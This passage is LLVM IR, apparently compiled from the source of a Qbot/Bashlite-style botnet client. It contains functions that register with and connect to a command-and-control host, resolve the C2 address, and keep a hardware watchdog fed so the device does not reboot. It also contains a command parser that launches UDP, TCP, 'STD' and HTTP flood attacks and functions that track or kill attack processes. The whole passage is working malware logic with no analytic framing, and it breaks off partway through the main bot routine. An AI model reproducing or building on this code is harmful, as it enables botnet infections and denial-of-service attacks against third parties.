  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numattackpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @attackpids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numattackpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @attackpids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #6
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @attackpids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind uwtable
define void @stop_attack() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i64 0, i64* %2, align 8
  br label %3

; <label>:3:                                      ; preds = %29, %0
  %4 = load i64, i64* %2, align 8
  %5 = load i64, i64* @numattackpids, align 8
  %6 = icmp ult i64 %4, %5
  br i1 %6, label %7, label %32

; <label>:7:                                      ; preds = %3
  %8 = load i32*, i32** @attackpids, align 8
  %9 = load i64, i64* %2, align 8
  %10 = getelementptr inbounds i32, i32* %8, i64 %9
  %11 = load i32, i32* %10, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %13, label %28

; <label>:13:                                     ; preds = %7
  %14 = load i32*, i32** @attackpids, align 8
  %15 = load i64, i64* %2, align 8
  %16 = getelementptr inbounds i32, i32* %14, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @getpid() #6
  %19 = icmp ne i32 %17, %18
  br i1 %19, label %20, label %28

; <label>:20:                                     ; preds = %13
  %21 = load i32*, i32** @attackpids, align 8
  %22 = load i64, i64* %2, align 8
  %23 = getelementptr inbounds i32, i32* %21, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = call i32 @kill(i32 %24, i32 9) #6
  %26 = load i32, i32* %1, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %1, align 4
  br label %28

; <label>:28:                                     ; preds = %20, %13, %7
  br label %29

; <label>:29:                                     ; preds = %28
  %30 = load i64, i64* %2, align 8
  %31 = add i64 %30, 1
  store i64 %31, i64* %2, align 8
  br label %3

; <label>:32:                                     ; preds = %3
  ret void
}

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @registerme(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [100 x i8], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %5 = load i8*, i8** %2, align 8
  %6 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %4, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i32 0, i32 0), i8* %5) #6
  %7 = load i32, i32* @C2, align 4
  %8 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %9 = getelementptr inbounds [100 x i8], [100 x i8]* %3, i32 0, i32 0
  %10 = call i64 @strlen(i8* %9) #10
  %11 = call i64 @write(i32 %7, i8* %8, i64 %10)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %1
  br label %15

; <label>:14:                                     ; preds = %1
  br label %15

; <label>:15:                                     ; preds = %14, %13
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @resolve_http() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.hostent*, align 8
  %3 = alloca %struct.in_addr**, align 8
  %4 = alloca i32, align 4
  %5 = load i8*, i8** @c2_http_host, align 8
  %6 = call %struct.hostent* @gethostbyname(i8* %5)
  store %struct.hostent* %6, %struct.hostent** %2, align 8
  %7 = icmp eq %struct.hostent* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %0
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  store i32 1, i32* %1, align 4
  br label %35

; <label>:9:                                      ; preds = %0
  %10 = load %struct.hostent*, %struct.hostent** %2, align 8
  %11 = getelementptr inbounds %struct.hostent, %struct.hostent* %10, i32 0, i32 4
  %12 = load i8**, i8*** %11, align 8
  %13 = bitcast i8** %12 to %struct.in_addr**
  store %struct.in_addr** %13, %struct.in_addr*** %3, align 8
  store i32 0, i32* %4, align 4
  br label %14

; <label>:14:                                     ; preds = %31, %9
  %15 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %15, i64 %17
  %19 = load %struct.in_addr*, %struct.in_addr** %18, align 8
  %20 = icmp ne %struct.in_addr* %19, null
  br i1 %20, label %21, label %34

; <label>:21:                                     ; preds = %14
  %22 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %23 = load i32, i32* %4, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %22, i64 %24
  %26 = load %struct.in_addr*, %struct.in_addr** %25, align 8
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  %28 = load i32, i32* %27, align 4
  %29 = call i8* @inet_ntoa(i32 %28) #6
  %30 = call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0), i8* %29) #6
  store i32 0, i32* %1, align 4
  br label %35
                                                  ; No predecessors!
  %32 = load i32, i32* %4, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %4, align 4
  br label %14

; <label>:34:                                     ; preds = %14
  store i32 1, i32* %1, align 4
  br label %35

; <label>:35:                                     ; preds = %34, %21, %8
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @watchdog_maintain() #0 {
  %1 = alloca [7 x i32], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = bitcast [7 x i32]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 28, i32 16, i1 false)
  store i32 1, i32* %2, align 4
  store i32 0, i32* %3, align 4
  call void @table_unlock_val(i8 zeroext 1)
  call void @table_unlock_val(i8 zeroext 2)
  call void @table_unlock_val(i8 zeroext 3)
  call void @table_unlock_val(i8 zeroext 4)
  call void @table_unlock_val(i8 zeroext 5)
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 7)
  %5 = call i8* @table_retrieve_val(i32 1, i32* null)
  %6 = call i32 (i8*, i32, ...) @open(i8* %5, i32 2)
  %7 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  store i32 %6, i32* %7, align 16
  %8 = icmp ne i32 %6, -1
  br i1 %8, label %39, label %9

; <label>:9:                                      ; preds = %0
  %10 = call i8* @table_retrieve_val(i32 2, i32* null)
  %11 = call i32 (i8*, i32, ...) @open(i8* %10, i32 2)
  %12 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  store i32 %11, i32* %12, align 4
  %13 = icmp ne i32 %11, -1
  br i1 %13, label %39, label %14

; <label>:14:                                     ; preds = %9
  %15 = call i8* @table_retrieve_val(i32 3, i32* null)
  %16 = call i32 (i8*, i32, ...) @open(i8* %15, i32 2)
  %17 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  store i32 %16, i32* %17, align 8
  %18 = icmp ne i32 %16, -1
  br i1 %18, label %39, label %19

; <label>:19:                                     ; preds = %14
  %20 = call i8* @table_retrieve_val(i32 4, i32* null)
  %21 = call i32 (i8*, i32, ...) @open(i8* %20, i32 2)
  %22 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  store i32 %21, i32* %22, align 4
  %23 = icmp ne i32 %21, -1
  br i1 %23, label %39, label %24

; <label>:24:                                     ; preds = %19
  %25 = call i8* @table_retrieve_val(i32 5, i32* null)
  %26 = call i32 (i8*, i32, ...) @open(i8* %25, i32 2)
  %27 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  store i32 %26, i32* %27, align 16
  %28 = icmp ne i32 %26, -1
  br i1 %28, label %39, label %29

; <label>:29:                                     ; preds = %24
  %30 = call i8* @table_retrieve_val(i32 6, i32* null)
  %31 = call i32 (i8*, i32, ...) @open(i8* %30, i32 2)
  %32 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  store i32 %31, i32* %32, align 4
  %33 = icmp ne i32 %31, -1
  br i1 %33, label %39, label %34

; <label>:34:                                     ; preds = %29
  %35 = call i8* @table_retrieve_val(i32 7, i32* null)
  %36 = call i32 (i8*, i32, ...) @open(i8* %35, i32 2)
  %37 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  store i32 %36, i32* %37, align 8
  %38 = icmp ne i32 %36, -1
  br i1 %38, label %39, label %61

; <label>:39:                                     ; preds = %34, %29, %24, %19, %14, %9, %0
  store i32 1, i32* %3, align 4
  %40 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %41 = load i32, i32* %40, align 16
  %42 = call i32 (i32, i64, ...) @ioctl(i32 %41, i64 2147768068, i32* %2) #6
  %43 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %44 = load i32, i32* %43, align 4
  %45 = call i32 (i32, i64, ...) @ioctl(i32 %44, i64 2147768068, i32* %2) #6
  %46 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %47 = load i32, i32* %46, align 8
  %48 = call i32 (i32, i64, ...) @ioctl(i32 %47, i64 2147768068, i32* %2) #6
  %49 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %50 = load i32, i32* %49, align 4
  %51 = call i32 (i32, i64, ...) @ioctl(i32 %50, i64 2147768068, i32* %2) #6
  %52 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %53 = load i32, i32* %52, align 16
  %54 = call i32 (i32, i64, ...) @ioctl(i32 %53, i64 2147768068, i32* %2) #6
  %55 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %56 = load i32, i32* %55, align 4
  %57 = call i32 (i32, i64, ...) @ioctl(i32 %56, i64 2147768068, i32* %2) #6
  %58 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %59 = load i32, i32* %58, align 8
  %60 = call i32 (i32, i64, ...) @ioctl(i32 %59, i64 2147768068, i32* %2) #6
  br label %61

; <label>:61:                                     ; preds = %39, %34
  %62 = load i32, i32* %3, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %64, label %88

; <label>:64:                                     ; preds = %61
  br label %65

; <label>:65:                                     ; preds = %65, %64
  %66 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %67 = load i32, i32* %66, align 16
  %68 = call i32 (i32, i64, ...) @ioctl(i32 %67, i64 2147768069, i32 0) #6
  %69 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = call i32 (i32, i64, ...) @ioctl(i32 %70, i64 2147768069, i32 0) #6
  %72 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %73 = load i32, i32* %72, align 8
  %74 = call i32 (i32, i64, ...) @ioctl(i32 %73, i64 2147768069, i32 0) #6
  %75 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %76 = load i32, i32* %75, align 4
  %77 = call i32 (i32, i64, ...) @ioctl(i32 %76, i64 2147768069, i32 0) #6
  %78 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %79 = load i32, i32* %78, align 16
  %80 = call i32 (i32, i64, ...) @ioctl(i32 %79, i64 2147768069, i32 0) #6
  %81 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %82 = load i32, i32* %81, align 4
  %83 = call i32 (i32, i64, ...) @ioctl(i32 %82, i64 2147768069, i32 0) #6
  %84 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %85 = load i32, i32* %84, align 8
  %86 = call i32 (i32, i64, ...) @ioctl(i32 %85, i64 2147768069, i32 0) #6
  %87 = call i32 @sleep(i32 3)
  br label %65

; <label>:88:                                     ; preds = %61
  call void @table_lock_val(i8 zeroext 1)
  call void @table_lock_val(i8 zeroext 2)
  call void @table_lock_val(i8 zeroext 3)
  call void @table_lock_val(i8 zeroext 4)
  call void @table_lock_val(i8 zeroext 5)
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 7)
  ret void
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind uwtable
define void @proc_cmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %5 = load i8**, i8*** %4, align 8
  %6 = getelementptr inbounds i8*, i8** %5, i64 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i8* @strstr(i8* %7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i32 0, i32 0)) #10
  %9 = icmp ne i8* %8, null
  br i1 %9, label %28, label %10

; <label>:10:                                     ; preds = %2
  %11 = load i8**, i8*** %4, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 0
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %15 = icmp ne i8* %14, null
  br i1 %15, label %28, label %16

; <label>:16:                                     ; preds = %10
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i8* @strstr(i8* %19, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0)) #10
  %21 = icmp ne i8* %20, null
  br i1 %21, label %28, label %22

; <label>:22:                                     ; preds = %16
  %23 = load i8**, i8*** %4, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strstr(i8* %25, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0)) #10
  %27 = icmp ne i8* %26, null
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %22, %16, %10, %2
  call void @stop_attack()
  br label %29

; <label>:29:                                     ; preds = %28, %22
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strstr(i8* %32, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i32 0, i32 0)) #10
  %34 = icmp ne i8* %33, null
  br i1 %34, label %41, label %35

; <label>:35:                                     ; preds = %29
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i8* @strstr(i8* %38, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0)) #10
  %40 = icmp ne i8* %39, null
  br i1 %40, label %41, label %68

; <label>:41:                                     ; preds = %35, %29
  %42 = load i32, i32* %3, align 4
  %43 = icmp slt i32 %42, 5
  br i1 %43, label %47, label %44

; <label>:44:                                     ; preds = %41
  %45 = load i32, i32* %3, align 4
  %46 = icmp sgt i32 %45, 5
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %44, %41
  br label %195

; <label>:48:                                     ; preds = %44
  %49 = call i32 @listFork()
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %48
  br label %195

; <label>:52:                                     ; preds = %48
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = load i8**, i8*** %4, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58) #10
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @atoi(i8* %62) #10
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 4
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @atoi(i8* %66) #10
  call void @udpflood(i8* %55, i32 %59, i32 %63, i32 %67)
  br label %68

; <label>:68:                                     ; preds = %52, %35
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i8* @strstr(i8* %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i32 0, i32 0)) #10
  %73 = icmp ne i8* %72, null
  br i1 %73, label %80, label %74

; <label>:74:                                     ; preds = %68
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i8* @strstr(i8* %77, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #10
  %79 = icmp ne i8* %78, null
  br i1 %79, label %80, label %110

; <label>:80:                                     ; preds = %74, %68
  %81 = load i32, i32* %3, align 4
  %82 = icmp slt i32 %81, 6
  br i1 %82, label %86, label %83

; <label>:83:                                     ; preds = %80
  %84 = load i32, i32* %3, align 4
  %85 = icmp sgt i32 %84, 6
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %83, %80
  br label %195

; <label>:87:                                     ; preds = %83
  %88 = call i32 @listFork()
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %87
  br label %195

; <label>:91:                                     ; preds = %87
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  %94 = load i8*, i8** %93, align 8
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 2
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #10
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 3
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* %101) #10
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 4
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105) #10
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 5
  %109 = load i8*, i8** %108, align 8
  call void @tcpflood(i8* %94, i32 %98, i32 %102, i32 %106, i8* %109)
  br label %110

; <label>:110:                                    ; preds = %91, %74
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 0
  %113 = load i8*, i8** %112, align 8
  %114 = call i8* @strstr(i8* %113, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %115 = icmp ne i8* %114, null
  br i1 %115, label %122, label %116

; <label>:116:                                    ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 0
  %119 = load i8*, i8** %118, align 8
  %120 = call i8* @strstr(i8* %119, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0)) #10
  %121 = icmp ne i8* %120, null
  br i1 %121, label %122, label %149

; <label>:122:                                    ; preds = %116, %110
  %123 = load i32, i32* %3, align 4
  %124 = icmp slt i32 %123, 5
  br i1 %124, label %128, label %125

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* %3, align 4
  %127 = icmp sgt i32 %126, 5
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %125, %122
  br label %195

; <label>:129:                                    ; preds = %125
  %130 = call i32 @listFork()
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %129
  br label %195

; <label>:133:                                    ; preds = %129
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 2
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #10
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 3
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 4
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @atoi(i8* %147) #10
  call void @stdflood(i8* %136, i32 %140, i32 %144, i32 %148)
  br label %149

; <label>:149:                                    ; preds = %133, %116
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i8* @strstr(i8* %152, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i32 0, i32 0)) #10
  %154 = icmp ne i8* %153, null
  br i1 %154, label %161, label %155

; <label>:155:                                    ; preds = %149
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 0
  %158 = load i8*, i8** %157, align 8
  %159 = call i8* @strstr(i8* %158, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0)) #10
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %195

; <label>:161:                                    ; preds = %155, %149
  %162 = load i32, i32* %3, align 4
  %163 = icmp slt i32 %162, 7
  br i1 %163, label %167, label %164

; <label>:164:                                    ; preds = %161
  %165 = load i32, i32* %3, align 4
  %166 = icmp sgt i32 %165, 7
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %164, %161
  br label %195

; <label>:168:                                    ; preds = %164
  %169 = call i32 @listFork()
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %168
  br label %195

; <label>:172:                                    ; preds = %168
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 1
  %175 = load i8*, i8** %174, align 8
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 2
  %178 = load i8*, i8** %177, align 8
  %179 = load i8**, i8*** %4, align 8
  %180 = getelementptr inbounds i8*, i8** %179, i64 3
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 @atoi(i8* %181) #10
  %183 = trunc i32 %182 to i16
  %184 = load i8**, i8*** %4, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 4
  %186 = load i8*, i8** %185, align 8
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 5
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #10
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 6
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* %193) #10
  call void @httpflood(i8* %175, i8* %178, i16 zeroext %183, i8* %186, i32 %190, i32 %194)
  br label %195

; <label>:195:                                    ; preds = %172, %171, %167, %155, %132, %128, %90, %86, %51, %47
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @parse_buffer(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [11 x i8*], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %7 = bitcast [11 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 88, i32 16, i1 false)
  %8 = load i8*, i8** %2, align 8
  %9 = call i8* @strtok(i8* %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %9, i8** %6, align 8
  br label %10

; <label>:10:                                     ; preds = %18, %1
  %11 = load i8*, i8** %6, align 8
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 10
  br label %16

; <label>:16:                                     ; preds = %13, %10
  %17 = phi i1 [ false, %10 ], [ %15, %13 ]
  br i1 %17, label %18, label %35

; <label>:18:                                     ; preds = %16
  %19 = load i8*, i8** %6, align 8
  %20 = call i64 @strlen(i8* %19) #10
  %21 = add i64 %20, 1
  %22 = call noalias i8* @malloc(i64 %21) #6
  %23 = load i32, i32* %4, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %4, align 4
  %25 = sext i32 %23 to i64
  %26 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %25
  store i8* %22, i8** %26, align 8
  %27 = load i32, i32* %4, align 4
  %28 = sub nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = load i8*, i8** %6, align 8
  %33 = call i8* @strcpy(i8* %31, i8* %32) #6
  %34 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %34, i8** %6, align 8
  br label %10

; <label>:35:                                     ; preds = %16
  %36 = load i32, i32* %4, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %35
  %39 = load i32, i32* %4, align 4
  %40 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i32 0, i32 0
  call void @proc_cmd(i32 %39, i8** %40)
  br label %41

; <label>:41:                                     ; preds = %38, %35
  store i32 0, i32* %3, align 4
  br label %42

; <label>:42:                                     ; preds = %51, %41
  %43 = load i32, i32* %3, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %54

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* %3, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %48
  %50 = load i8*, i8** %49, align 8
  call void @free(i8* %50) #6
  br label %51

; <label>:51:                                     ; preds = %46
  %52 = load i32, i32* %3, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %3, align 4
  br label %42

; <label>:54:                                     ; preds = %42
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @qbot() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [11 x i8*], align 16
  %4 = call i32 @fork() #6
  %5 = icmp sgt i32 %4, 0
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %0
  br label %75

; <label>:7:                                      ; preds = %0
  store i32 0, i32* %2, align 4
  %8 = bitcast [11 x i8*]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 88, i32 16, i1 false)
  %9 = call i32 @resolve_http()
  br label %10

; <label>:10:                                     ; preds = %40, %7
  %11 = load i32, i32* @C2, align 4
  %12 = load i32, i32* @C2, align 4
  %13 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 3, i32 0)
  %14 = or i32 %13, 2048
  %15 = call i32 (i32, i32, ...) @fcntl(i32 %11, i32 4, i32 %14)
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %16, i32* @C2, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %22

; <label>:18:                                     ; preds = %10
  %19 = load i32, i32* @C2, align 4
  %20 = call i32 @close(i32 %19)
  %21 = call i32 @close(i32 0)
  br label %22

; <label>:22:                                     ; preds = %18, %10
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i32 0, i32 0), align 4
